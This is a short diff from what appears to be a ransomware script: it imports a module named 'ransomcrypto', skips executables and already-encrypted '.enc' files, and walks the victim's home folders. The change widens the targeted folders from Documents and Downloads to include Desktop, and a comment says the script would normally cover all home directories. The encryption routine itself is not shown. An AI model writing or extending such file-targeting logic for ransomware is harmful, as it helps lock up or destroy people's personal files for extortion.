@@ -22,7 +22,7 @@ from ransomcrypto import *
 excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
 
 
-priority_dirs = ['Documents', 'Downloads'] # would normally do all folders in users home dir
+priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir
 
 for target in priority_dirs:
     for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
